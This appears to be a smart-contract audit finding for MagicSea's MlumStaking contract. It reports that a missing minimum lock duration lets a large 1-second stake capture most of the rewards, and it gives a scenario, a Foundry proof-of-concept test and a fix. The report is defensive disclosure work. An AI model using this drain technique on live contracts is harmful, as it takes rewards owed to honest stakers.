# Attackers can drain the rewards

## Summary
Due to the lack of a minimun `lockDuration`, users are able to create a position with 1 second as duration, get rewarded and then unlock their money.

## Vulnerability Detail
The `createPosition` function in `MlumStaking.sol` [checks if `lockDuration` is greater than 0](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L357):
```solidity
    function createPosition(uint256 amount, uint256 lockDuration) external override nonReentrant {
        // no new lock can be set if the pool has been unlocked
        if (isUnlocked()) {
            require(lockDuration == 0, "locks disabled");
        }
```
However, due to the lack of a **minimum `lockDuration`** check, an attacker can create a position with a huge amount and 1 second as `lockDuration`, receive rewards, and withdraw their funds.

- Alice creates a position and locks 100e18 for 30 days.
- Bob creates a position and locks 100e18 for 30 days.
- Charlie (malicious actor) creates a position and locks 10,000e18 for 1 second.
- The admin mints 100e6 rewards for MlumStaking.
- Alice calls harvest and receives 1,137,805 tokens (1.14%).
- Bob calls harvest and receives 1,137,805 tokens (1.14%).
- Charlie calls harvest and receives 97,724,389 tokens (97.72%), then immediately calls `withdrawFromPosition` to withdraw his funds, while Alice's and Bob's funds remain locked until their lockDuration expires.

### Coded PoC
Above scenario is implemented in this test code
Please add this test function to `MlumStaking.t.sol`

```solidity
    function test_DrainRewards() public {
        _stakingToken.mint(ALICE, 100 ether);
        _stakingToken.mint(BOB, 100 ether);
        _stakingToken.mint(CHARLIE, 10000 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 100 ether);
        _pool.createPosition(100 ether, 30 days);
        vm.stopPrank();

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 100 ether);
        _pool.createPosition(100 ether,  30 days);
        vm.stopPrank();

        vm.startPrank(CHARLIE);
        _stakingToken.approve(address(_pool), 10000 ether);
        _pool.createPosition(10000 ether, 1 seconds);
        vm.stopPrank();

        skip(1 seconds);

        _rewardToken.mint(address(_pool), 100_000_000);

        vm.prank(ALICE);
        _pool.harvestPosition(1);

        vm.prank(BOB);
        _pool.harvestPosition(2);

        // Charlie harvests and withdraws his money
        vm.startPrank(CHARLIE);
        _pool.harvestPosition(3);
        _pool.withdrawFromPosition(3, 10000 ether);
        vm.stopPrank();
        assertEq(_stakingToken.balanceOf(CHARLIE), 10000 ether);

        console.log("%s%s", "Alice's reward:    ",_rewardToken.balanceOf(ALICE));
        console.log("%s%s", "Bob's reward:      ",_rewardToken.balanceOf(BOB));
        console.log("%s%s", "Charlies's reward: ",_rewardToken.balanceOf(CHARLIE));
    }
```

Manual Review

## Recommendation
There should be a minimum `lockDuration` check in `createPosition`
